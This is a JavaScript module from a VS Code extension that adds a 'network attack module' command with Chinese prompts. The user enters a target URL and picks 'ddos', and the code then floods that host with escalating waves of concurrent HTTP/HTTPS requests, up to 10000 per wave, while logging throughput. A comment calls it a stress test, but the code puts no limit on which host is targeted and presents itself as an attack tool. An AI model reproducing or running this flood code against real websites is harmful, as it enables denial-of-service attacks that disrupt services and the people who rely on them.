const vscode = require('vscode');
const parse = require('url-parse');
const request = require('request');
const { InTPanel, MultiStepInput } = require('./util');
module.exports = (context) => {
  vscode.commands.registerCommand('IntegrationTool.attack', () => {
    const attack = new Attack
    attack.AttackInput(context)
  })
}

class Attack {
  constructor() {
    //输出面板
    this.Attacklog = InTPanel;//在输出的任务选项下创建一个输出面板
  }

  /*AttackInput */
  async AttackInput(context) {
    //按钮类
    class MyButton {
      constructor(iconPath, tooltip) {
        this.iconPath = iconPath;           //按钮地址
        this.tooltip = tooltip;             //按钮提示
      }
    }
    //创建一个按钮（创建资源组按钮）
    const createResourceGroupButton = new MyButton({
      dark: vscode.Uri.file(context.asAbsolutePath('images/dark/add.svg')),  //获取按钮图片地址
      light: vscode.Uri.file(context.asAbsolutePath('images/light/add.svg')),
    }, '其他');
    //设置资源组(multiStepInput的选项)
    const FuncGroup = ['攻击', '记录'].map((label) => ({ label }));
    const title = '网络攻击模块';
    // 选择资源组，quick选项
    async function pickResourceGroup(input, state) {
      const pick = await input.showQuickPick({
        title,
        step: 1,
        totalSteps: 3,
        ignoreFocusOut: true,
        placeholder: '选一个方式',
        items: FuncGroup,
        activeItem: typeof state.resourceGroup !== 'string' ? state.resourceGroup : undefined,
        buttons: [createResourceGroupButton],
        shouldResume: shouldResume
      });
      if (pick instanceof MyButton) {   //判断实例
        return (input) => inputResourceGroupName(input, state);
      }
      state.resourceGroup = pick;
      return (input) => inputName(input, state);
    }
    //获取输入
    async function collectInputs() {
      const state = {};
      await MultiStepInput.run((input) => pickResourceGroup(input, state));
      return state;
    }
    //输入资源组名称
    async function inputResourceGroupName(input, state) {
      state.resourceGroup = await input.showInputBox({
        title,
        step: 1,
        totalSteps: 3,
        ignoreFocusOut: true,
        value: typeof state.resourceGroup === 'string' ? state.resourceGroup : '',
        prompt: '请输入要攻击的网址（带协议头,如："http:" | "https:"）',
        placeholder: '其他方式',
        validate: validateNameIsUnique,
        shouldResume: shouldResume
      });
      return (input) => pickRuntime(input, state);
    }
    //输入名称
    async function inputName(input, state) {
      /*暂时 */
      console.log(state.resourceGroup.label);
      if (state.resourceGroup.label === '记录') {
        vscode.window.showInformationMessage(`开发中`);
        return;
      }

      const additionalSteps = typeof state.resourceGroup === 'string' ? 1 : 0;
      // TODO: Remember current value when navigating back.
      state.name = await input.showInputBox({
        title,
        step: 2 + additionalSteps,
        ignoreFocusOut: true,
        totalSteps: 3 + additionalSteps,
        value: state.name || '',
        prompt: '请输入要攻击的网址（带协议头,如："http:" | "https:"）',
        validate: validateNameIsUnique,
        shouldResume: shouldResume
      });
      return (input) => pickRuntime(input, state);
    }
    //选择运行时
    async function pickRuntime(input, state) {
      const additionalSteps = typeof state.resourceGroup === 'string' ? 1 : 0;
      const runtimes = await getAvailableRuntimes(state.resourceGroup, undefined /* TODO: token */);
      // TODO: 向后导航时记住当前活动的项目.
      state.runtime = await input.showQuickPick({
        title,
        step: 3 + additionalSteps,
        ignoreFocusOut: true,
        totalSteps: 3 + additionalSteps,
        placeholder: 'attack',
        prompt: '请选择攻击一个方式',
        items: runtimes,
        activeItem: state.runtime,
        shouldResume: shouldResume
      });
    }
    function shouldResume() {
      // 可以显示带有恢复选项的通知。
      return new Promise((resolve, reject) => {
        // noop
      });
    }
    //判断
    async function validateNameIsUnique(name) {
      await new Promise(resolve => setTimeout(resolve, 500));
      return (name.substr(0, 5) === 'http:' || name.substr(0, 6) === 'https:') ? null : '请输入正确的网址!';
    }
    //获取可用的运行时
    async function getAvailableRuntimes(resourceGroup, token) {
      // ...retrieve...
      await new Promise(resolve => setTimeout(resolve, 1000));    //延迟
      return ['ddos', 'CC', '取消']
        .map(label => ({ label }));
    }
    const state = await collectInputs();
    switch (state.runtime.label) {
      case 'ddos':
        this.Attackhttp(state.name);
        break;
      case 'CC':
        return vscode.window.showInformationMessage(`${state.runtime.label} 开发中`);
      case '取消':
        return vscode.window.showInformationMessage(`取消攻击`);;
      default:
        console.log('null')
        break
    }
    vscode.window.showInformationMessage(`attack: '${state.name}'`);
  }

  //attack
  Attackhttp(uri) {
    const parts = parse(uri);
    const server = parts.protocol == 'https:' ? require('https') : require('http');
    const runs = [1, 10, 10, 100, 100, 100, 200, 200, 200, 200, 500, 1000, 10000]
    /**
     * 对HTTP / HTTPS端点进行压力测试，并增加曲线
     * 使用方式: attack https://url.com/foo
     */
    if (uri === undefined || uri === null) {
      vscode.window.showErrorMessage("不能为空");
      return 0;
    }
    GetResponse(uri);
    //显示输出面板
    var Attacklog = this.Attacklog;
    Attacklog.clear()
    Attacklog.show();
    Attacklog.appendLine("attack:" + uri);
    // console.log(parts);
    function attack(count, cb) {
      let good = 0
      let bad = 0
      let requests = []
      for (let n = 0; n < count; n++) {
        requests.push(
          server.get({
            hostname: parts.hostname,
            port: parts.port,
            agent: false
          }, (res) => {
            good++
            if (good + bad == count) {
              cb(good, bad)
            }
          })
            .on('error', (err) => {
              bad++
              //如果超过20％的请求出错，则保释
              if (bad / (good + bad) > 0.2) {
                // cancel in flight requests
                requests.forEach((request) => {
                  if (request.abort) {
                    request.abort()
                  }
                })
                cb(good, bad)
              }
              if (good + bad == count) {
                cb(good, bad)
              } else {
                // console.log(err);
                Attacklog.appendLine("error");
                throw err;
              }
            })
        )
      }
    }
    async function go(runs) {
      let start = Date.now()
      await attack(runs[0], (good, bad) => {
        let total = good + bad;
        let rate = good / total;
        let time = Date.now() - start;
        let niceRate = (100 * rate).toFixed(2) + '%';//颜色
        Attacklog.appendLine(`${runs[0]} requests:${good}/${total}(${niceRate}) - done in ${time} ms (${(time / total).toFixed(2)} ms/request, ${(total / (time / 1000)).toFixed(2)} qps)`);
        if (rate > 0.8) {
          setTimeout(function () {
            go(runs.slice(1))
          }, 5000);

        } else {
          Attacklog.appendLine('done!')
        }

      })
    }
    function GetResponse(url) {
      request({
        url: url,
        method: "GET",
        encoding: null, // setting null can avoid some encoding trouble
        headers: {
          //'Accept-Encoding': 'gzip, deflate'
        }
      }, function (error, body) {
        if (body) {
          console.log("正常访问");
        } else if (error) {
          console.log(error);
          console.log("访问错误");
          vscode.window.showErrorMessage("访问错误");
          return -1;
        }
      })
      //socket信息
      // .on('socket', function (sok){
      //     console.log(sok);
      //     sok.on('data', function (fin){
      //         console.log(fin);
      //     });
      // });
    }
    Attacklog.appendLine('swarming:' + uri + '...');
    go(runs)
  }
}



